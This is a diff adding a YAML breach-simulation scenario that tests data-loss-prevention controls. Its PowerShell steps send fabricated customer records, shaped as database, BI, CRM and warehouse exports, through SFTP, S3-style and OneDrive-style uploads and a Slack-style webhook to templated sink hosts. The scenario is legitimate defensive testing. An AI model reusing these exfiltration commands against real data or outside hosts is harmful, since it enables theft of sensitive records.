@@ -1,0 +1,221 @@
+id: dlp-exfiltration-db-export
+name: DLP Exfiltration Validation — Database, BI and ERP Export Channels
+description: >
+  Attempts to exfiltrate synthetic data shaped as the 4 specific export
+  types dlp.txt §3B's DLP-DB family names (database extracts, BI exports,
+  CRM/ERP reports, and data warehouse extracts), each via managed file
+  transfer or an existing upload/sharing channel already verified by a
+  sibling scenario in this program -- this scenario's only new content is
+  the export pretext and framing; the transports themselves
+  (internal/sftpsink, internal/cloudsink, internal/webhooksink) are
+  unchanged and already independently tested by their own scenarios.
+
+  Closes the DLP-DB gap named in dlp.txt §1.06 and §3B. The stock
+  BFSI/India CSV record used by every other channel in this program is
+  already shaped like a flat database extract; what was missing was a
+  scenario that frames the payload explicitly as a SQL query result, a BI
+  dashboard export, a CRM/ERP report, and a data-warehouse unload file --
+  the 4 distinct narratives dlp.txt's own DLP-DB description names, each
+  via a different plausible real-world sharing path for that artifact
+  type. Verdict comes from whether the platform's own sink for each
+  step's channel ever receives a request whose embedded token matches
+  this run -- ground truth resolved server-side, never from anything the
+  step's own script can locally confirm.
+
+  Scope boundary (named explicitly): this scenario does not implement a
+  real database client, a real BI tool, or a real CRM/ERP connector --
+  each step's "export" is a synthetic, pre-formed text payload shaped
+  like that artifact type's real output, exfiltrated via an already
+  sink-verified channel. No new transport code was added for this
+  scenario; see the specific sibling scenario named in each step's own
+  comment for that channel's own verification discipline.
+
+  Safety: all synthetic data is fabricated ([BAS-SIM-DLP] tagged), never
+  real. Every destination is this same on-prem orchestrator's own main
+  API server or purpose-built sink listener -- no external SFTP server,
+  cloud account, or chat workspace is ever contacted. Windows only.
+author: Audspect Research
+executable: true
+supported_os: [windows]
+tags:
+  - dlp
+  - data-protection-validation
+  - exfiltration
+  - database
+  - bi
+  - erp
+  - windows
+  - mitre-attack
+  - bfsi
+  - india
+mitre_phases:
+  - collection
+  - exfiltration
+
+steps:
+
+  # ---------------------------------------------------------------------------
+  # Export 1 — Database extract (SQL query result) via managed file transfer (SFTP)
+  # ---------------------------------------------------------------------------
+  - name: "DLP Validation — SQL Query Result Export via SFTP Managed File Transfer (T1048.002)"
+    technique_id: T1048.002
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Uploads a synthetic SQL-query-result-shaped file via SFTP to the platform's own SFTP listener (this same on-prem orchestrator, already verified by dlp-exfiltration-sftp.yaml). No real database or SFTP server is contacted. If the endpoint has no OpenSSH Client installed, the step is skipped rather than attempted."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on the configured SFTP sink port"
+      - "Sysmon EID 1: sftp.exe process creation"
+    detection:
+      - "DLP/network: SSH/SFTP protocol handshake and file-transfer content inspection"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $sftpCmd = Get-Command sftp.exe -ErrorAction SilentlyContinue
+      if (-not $sftpCmd) {
+        Write-Output "skip: sftp.exe (OpenSSH Client) not found on this endpoint"
+        exit 0
+      }
+      $exportContent = "-- [BAS-SIM-DLP] Query result: SELECT customer_id, pan, aadhaar, swift, upi, credit_card FROM customers WHERE region = 'IN'`nBAS-SIM-SINK,ABCDE1234F,123456789012,SBININBBXXX,fake.user@upi,4111111111111111`n-- 1 row exported, synthetic test fixture only"
+      $tempFile = New-TemporaryFile
+      Set-Content -Path $tempFile -Value $exportContent -NoNewline
+      $remoteFile = "{{SINK_TOKEN}}.dat"
+      $batchFile = New-TemporaryFile
+      "put `"$($tempFile.FullName)`" `"$remoteFile`"" | Set-Content -Path $batchFile
+      try {
+        $output = & sftp.exe -oBatchMode=yes -oStrictHostKeyChecking=no -oUserKnownHostsFile=NUL -P {{SINK_SFTP_PORT}} -b $batchFile dlptest@{{SINK_SFTP_HOST}} 2>&1
+        $exitCode = $LASTEXITCODE
+        Write-Output "DLP_OBSERVATION: sftp_exit_code=$exitCode"
+        foreach ($line in $output) { Write-Output "DLP_OBSERVATION: sftp_output=$line" }
+        Write-Output "EXEC T1048.002: SQL-query-result-shaped SFTP export completed (see sink verification for the actual verdict). [BAS-SIM-DLP-DBEXPORT-SQL]"
+      } catch {
+        Write-Output "DLP_OBSERVATION: sftp_exception=$($_.Exception.Message)"
+        Write-Output "EXEC T1048.002: SQL-query-result-shaped SFTP export raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-DBEXPORT-SQL]"
+      } finally {
+        Remove-Item -Path $tempFile -ErrorAction SilentlyContinue
+        Remove-Item -Path $batchFile -ErrorAction SilentlyContinue
+      }
+      # Verdict resolved server-side by internal/sftpsink + internal/verifysync
+      # + internal/reporting's sink-primary dlpVerifier -- same discipline as
+      # dlp-exfiltration-sftp.yaml, never from this script's own exit code.
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Export 2 — BI dashboard export uploaded to cloud storage (S3-compatible)
+  # ---------------------------------------------------------------------------
+  - name: "DLP Validation — BI Dashboard Export via S3-Compatible Cloud Upload (T1567.002)"
+    technique_id: T1567.002
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "PUTs a synthetic BI-dashboard-export-shaped record to the platform's own S3-compatible-shaped endpoint (this same on-prem orchestrator, already verified by dlp-exfiltration-cloud-storage.yaml). No real AWS account, no real S3 bucket, no real BI tool -- traffic-shape simulation only."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on its main API port"
+    detection:
+      - "DLP/CASB: S3-shaped HTTPS PUT (path structure, x-amz-* headers) content inspection"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $exportContent = "[BAS-SIM-DLP] BI Dashboard Export: Revenue-by-Customer (Synthetic)`nCustomerID,PAN,Aadhaar,SWIFT,UPI,CreditCard,RevenueINR`nBAS-SIM-SINK,ABCDE1234F,123456789012,SBININBBXXX,fake.user@upi,4111111111111111,0.00"
+      $token = "{{SINK_TOKEN}}"
+      $uri = "https://{{SINK_CLOUD_HOST}}:{{SINK_CLOUD_PORT}}/cloudsink/s3/bas-sim-bi-exports/$token.dat"
+      try {
+        Invoke-RestMethod -Uri $uri -Method Put -Body $exportContent `
+          -Headers @{ 'x-amz-content-sha256' = 'UNSIGNED-PAYLOAD'; 'x-amz-date' = (Get-Date).ToUniversalTime().ToString('yyyyMMddTHHmmssZ') } `
+          -ContentType 'application/octet-stream' -TimeoutSec 10 | Out-Null
+        Write-Output "DLP_OBSERVATION: s3_put_result=success"
+        Write-Output "EXEC T1567.002: BI-dashboard-export-shaped S3 upload completed (see sink verification for the actual verdict). [BAS-SIM-DLP-DBEXPORT-BI]"
+      } catch {
+        Write-Output "DLP_OBSERVATION: s3_put_exception=$($_.Exception.Message)"
+        Write-Output "EXEC T1567.002: BI-dashboard-export-shaped S3 upload raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-DBEXPORT-BI]"
+      }
+      # Verdict resolved server-side by internal/cloudsink + internal/verifysync
+      # + internal/reporting's sink-primary dlpVerifier -- same discipline as
+      # dlp-exfiltration-cloud-storage.yaml, never from this script's own
+      # success/failure.
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Export 3 — CRM/ERP report shared via OneDrive-compatible upload
+  # ---------------------------------------------------------------------------
+  - name: "DLP Validation — CRM/ERP Report Export via OneDrive-Compatible Upload (T1567.002)"
+    technique_id: T1567.002
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "PUTs a synthetic CRM/ERP-report-shaped record to the platform's own Graph-API-shaped endpoint (this same on-prem orchestrator, already verified by dlp-exfiltration-cloud-storage.yaml). No real Microsoft 365 account, no real OneDrive, no real CRM/ERP system -- traffic-shape simulation only."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on its main API port"
+    detection:
+      - "DLP/CASB: Microsoft-Graph-shaped HTTPS PUT (upload-by-path structure) content inspection"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $exportContent = "[BAS-SIM-DLP] CRM Export: Account-Contact-Report (Synthetic)`nAccountID,PAN,Aadhaar,SWIFT,UPI,CreditCard`nBAS-SIM-SINK,ABCDE1234F,123456789012,SBININBBXXX,fake.user@upi,4111111111111111"
+      $token = "{{SINK_TOKEN}}"
+      $uri = "https://{{SINK_CLOUD_HOST}}:{{SINK_CLOUD_PORT}}/cloudsink/graph/v1.0/me/drive/root:/$token.dat:/content"
+      try {
+        Invoke-RestMethod -Uri $uri -Method Put -Body $exportContent -ContentType 'text/plain' -TimeoutSec 10 | Out-Null
+        Write-Output "DLP_OBSERVATION: onedrive_put_result=success"
+        Write-Output "EXEC T1567.002: CRM/ERP-report-shaped OneDrive upload completed (see sink verification for the actual verdict). [BAS-SIM-DLP-DBEXPORT-CRM]"
+      } catch {
+        Write-Output "DLP_OBSERVATION: onedrive_put_exception=$($_.Exception.Message)"
+        Write-Output "EXEC T1567.002: CRM/ERP-report-shaped OneDrive upload raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-DBEXPORT-CRM]"
+      }
+      # Verdict resolved server-side the same way as the S3 step above.
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Export 4 — Data warehouse extract shared via Slack-compatible webhook
+  # ---------------------------------------------------------------------------
+  - name: "DLP Validation — Data Warehouse Extract Export via Slack-Compatible Webhook (T1567.004)"
+    technique_id: T1567.004
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "POSTs a synthetic data-warehouse-unload-shaped record to the platform's own Slack-webhook-shaped endpoint (this same on-prem orchestrator, already verified by dlp-exfiltration-webhook.yaml). No real Slack workspace, no real data warehouse -- traffic-shape simulation only."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on its main API port"
+    detection:
+      - "DLP/CASB: Slack-webhook-shaped HTTPS POST content inspection"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $exportContent = "[BAS-SIM-DLP] Data Warehouse Unload: customers_2026Q4.csv (Synthetic)`nCustomerID,PAN,Aadhaar,SWIFT,UPI,CreditCard`nBAS-SIM-SINK,ABCDE1234F,123456789012,SBININBBXXX,fake.user@upi,4111111111111111"
+      $token = "{{SINK_TOKEN}}"
+      $body = @{ text = "$token`n$exportContent" } | ConvertTo-Json -Compress
+      $uri = "https://{{SINK_WEBHOOK_HOST}}:{{SINK_WEBHOOK_PORT}}/webhooksink/slack/services/T00000000/B00000000/XXXXXXXXXXXXXXXXXXXXXXXX"
+      try {
+        Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType 'application/json' -TimeoutSec 10 | Out-Null
+        Write-Output "DLP_OBSERVATION: slack_webhook_result=success"
+        Write-Output "EXEC T1567.004: Data-warehouse-unload-shaped webhook export completed (see sink verification for the actual verdict). [BAS-SIM-DLP-DBEXPORT-WAREHOUSE]"
+      } catch {
+        Write-Output "DLP_OBSERVATION: slack_webhook_exception=$($_.Exception.Message)"
+        Write-Output "EXEC T1567.004: Data-warehouse-unload-shaped webhook export raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-DBEXPORT-WAREHOUSE]"
+      }
+      # Verdict resolved server-side the same way as dlp-exfiltration-webhook.yaml.
+    cleanup: ""
